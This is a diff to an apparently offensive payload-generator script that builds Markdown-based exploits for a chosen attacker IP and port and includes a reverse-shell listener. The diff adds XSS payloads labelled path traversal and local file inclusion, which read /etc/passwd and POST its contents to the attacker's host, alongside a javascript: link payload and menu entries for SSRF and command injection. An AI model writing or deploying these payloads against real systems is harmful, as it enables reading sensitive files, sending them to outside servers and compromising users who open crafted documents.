@@ -82,12 +82,10 @@ def get_payload(extension, ip, port):
                 # Useful for XSS attacks in browsers or applications with insufficient sanitization.
                 "[Click Me](javascript:alert('Exploit Successful!'))"
             ),
-            "embedded_script": (
-                # Markdown payload with an embedded script for data exfiltration
-                # This uses JavaScript's `fetch` API to send document content to the attacker's server.
-                # Useful for testing XSS and data exfiltration vulnerabilities.
-                # By default attempts to get the /etc/passwd file - can be changed using nano
-                f"<script>\nfetch('/etc/passwd')\n"
+            "path_traversal": (
+                # Markdown payload for path traversal
+                # This attempts to fetch /etc/passwd via a traversal attack.
+                f"<script>\nfetch('/../../../../../etc/passwd')\n"
                 f"  .then(response => response.text())\n"
                 f"  .then(data => {{\n"
                 f"    fetch('http://{ip}:{port}/', {{\n"
@@ -96,6 +94,19 @@ def get_payload(extension, ip, port):
                 f"    }});\n"
                 f"  }})\n"
                 f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
+            ),
+            "lfi": (
+                # Markdown payload for Local File Inclusion (LFI)
+                # Attempts to fetch /etc/passwd via a vulnerable LFI endpoint.
+                f"<script>\nfetch('/file?path=/etc/passwd')\n"
+                f"  .then(response => response.text())\n"
+                f"  .then(data => {{\n"
+                f"    fetch('http://{ip}:{port}/', {{\n"
+                f"      method: 'POST',\n"
+                f"      body: JSON.stringify({{ fileContents: data }})\n"
+                f"    }});\n"
+                f"  }})\n"
+                f"  .catch(error => console.error('Error fetching file:', error));\n</script>"
             )
         },
         ".sh": (
@@ -125,8 +136,6 @@ def get_payload(extension, ip, port):
     }
     return payloads.get(extension, f"# No payload available for {extension}")
 
-
-
 def generate_payload():
     """Interactively generate a payload."""
     print("\n[!] Generate a Payload")
@@ -147,14 +156,15 @@ def generate_payload():
         return
 
     if extension == ".md":
-    # Provide specific options for Markdown exploits with descriptions
+        # Provide specific options for Markdown exploits with descriptions
         md_exploit_types = {
             "image_ssrf": "(SSRF using an image link, requires a server to fetch the image)",
             "html_xss": "(Embedded XSS using HTML, requires a browser or vulnerable renderer)",
             "code_injection": "(Command injection via a code block, requires user execution)",
             "file_inclusion": "(Local file inclusion using path traversal)",
             "javascript_link": "(XSS through a JavaScript link, requires user interaction)",
-            "embedded_script": "(This uses JavaScript's `fetch` API to send document content to the attacker's server. (By default it is /etc/passwd))"
+            "path_traversal": "(Fetch /etc/passwd via path traversal, requires vulnerability)",
+            "lfi": "(Fetch /etc/passwd via Local File Inclusion endpoint)"
         }
         print("[!] Available Markdown Exploits:")
         for i, (md_type, description) in enumerate(md_exploit_types.items(), 1):
@@ -202,7 +212,6 @@ def generate_payload():
             print(f"[X] Error saving payload: {e}")
     else:
         print("[X] Payload not saved.")
-
 
 def setup_listener(port):
     """Set up a reverse shell listener."""
